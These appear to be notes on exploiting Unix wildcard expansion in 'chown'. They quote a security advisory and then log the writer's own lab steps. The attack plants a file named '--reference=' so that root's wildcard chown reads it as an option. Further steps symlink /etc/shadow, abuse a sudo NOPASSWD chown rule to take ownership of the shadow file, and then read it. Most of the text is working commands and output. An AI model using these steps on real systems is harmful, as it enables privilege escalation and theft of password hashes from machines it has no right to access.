https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

https://www.slideshare.net/FaresEmir/old-school-hacking-exploiting-unix-wildcards

==[ Chown file reference trick (file owner hijacking) ]==

First really interesting target I've stumbled across is 'chown'. 
Let's say that we have some publicly writeable directory with bunch of
PHP files in there, and root user wants to change owner of all PHP files to 'nobody'.
Pay attention to the file owners in the following files list.

[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php

Files in this public directory are mostly owned by the user named 'user', 
and root user will now change that to 'nobody'.

[root@defensecode public]# chown -R nobody:nobody *.php

Let's see who owns files now...

[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx------. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php

Something is not right... What happened? Somebody got drunk here.
Superuser tried to change files owner to the user:group 'nobody', but somehow, 
all files are owned by the user 'leon' now.

If we take closer look, this directory previously contained just the 
following two files created and owned by the user 'leon'.

-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

Thing is that wildcard character used in 'chown' command line took arbitrary 
'--reference=.drf.php' file and passed it to the chown command at
the command line as an option.

Let's check chown manual page (man chown):
   --reference=RFILE
          use RFILE's owner and group rather than specifying OWNER:GROUP values

So in this case, '--reference' option to 'chown' will override 'nobody:nobody'
specified as the root, and new owner of files in this directory will be exactly
same as the owner of '.drf.php', which is in this case user 'leon'.
Just for the record, '.drf' is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some 
arbitrary user. If we set some other file as argument to the --reference option,
file that's owned by some other user, not 'leon', in that case he would become owner 
of all files in this directory.

With this simple chown parameter pollution, we can trick root into changing ownership 
of files to arbitrary users, and practically "hijack" files that are of interest to us.

Even more, if user 'leon' previously created a symbolic link in that directory 
that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed 
to the user 'leon'.

echo > ".hidden_file.txt"
chown user:user .hidden_file.txt
echo > "--reference=.hidden_file.txt"

sudo chown -R root *

=====================================================

step 1 :
-rw-r--r-- 1 root root    0 Oct 30 16:10 spfile.txt
lrwxrwxrwx 1 user user   11 Oct 30 16:10 shadow.txt -> /etc/shadow
-rw-r--r-- 1 user user    0 Oct 30 16:09 .hidden.txt
-rw-r--r-- 1 user user    1 Oct 30 16:10 --reference=.hidden.txt

step 2:

sudo -l 
(root) NOPASSWD: /bin/chown -hR * *.txt

step 3:
sudo chown -hR root:root *.txt

-rw-r--r-- 1 user user    0 Oct 30 16:10 spfile.txt
lrwxrwxrwx 1 user user   11 Oct 30 16:10 shadow.txt -> /etc/shadow
-rw-r--r-- 1 user user    0 Oct 30 16:09 .hidden.txt
-rw-r--r-- 1 user user    1 Oct 30 16:10 --reference=.hidden.txt


To get the shadow file 

if you want to use the same technique to get the shadow file : check the -H argument > change the properties of syslink files

ln -sf /etc/shadow shadow.txt

sudo chown -HR root *

=========================================================

user@66ef2d7e0a67:~/test$ sudo -l 
user ALL=(root) NOPASSWD: /bin/chown -hR * *.txt
user ALL=(root) NOPASSWD: /bin/chown -HR * *.txt

user@66ef2d7e0a67:~/test$ ls -alr
total 8
-rw-r--r-- 1 user user    0 Oct 30 13:25 test6.txt
-rw-r--r-- 1 root root    0 Oct 30 13:11 test1.txt
-rw-r--r-- 1 user user    0 Oct 30 13:26 --reference=test6.txt


touch shadow.txt
ln -sf /etc/shadow /home/user/directory/shadow.txt


user@66ef2d7e0a67:~/test$ ls -alr
total 8
-rw-r--r-- 1 user user    0 Oct 30 13:25 test6.txt
-rw-r--r-- 1 root root    0 Oct 30 13:11 test1.txt
-rw-r--r-- 1 root root    0 Oct 30 13:25 shadow.txt -> /etc/shadow
-rw-r--r-- 1 user user    0 Oct 30 13:26 --reference=test6.txt

 chown -HR root:root *.txt

 cat shadow.txt

 Bingo! chown -H should be used to be able to change the ownership 



